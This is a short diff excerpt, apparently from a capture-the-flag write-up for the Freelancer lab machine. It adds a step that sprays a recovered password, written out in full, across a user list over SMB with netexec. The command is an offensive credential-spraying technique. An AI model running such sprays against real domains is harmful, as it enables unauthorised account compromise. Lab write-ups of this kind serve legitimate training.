@@ -646,5 +646,11 @@ PWN3D#l0rr@Armessa199
 
 This looks like a password
 
+# Password spray leads to user compromise
 
+```python
+nxc smb dc.freelancer.htb -u users.txt -p 'PWN3D#l0rr@Armessa199' --continue-on-success
+
+
+```
 
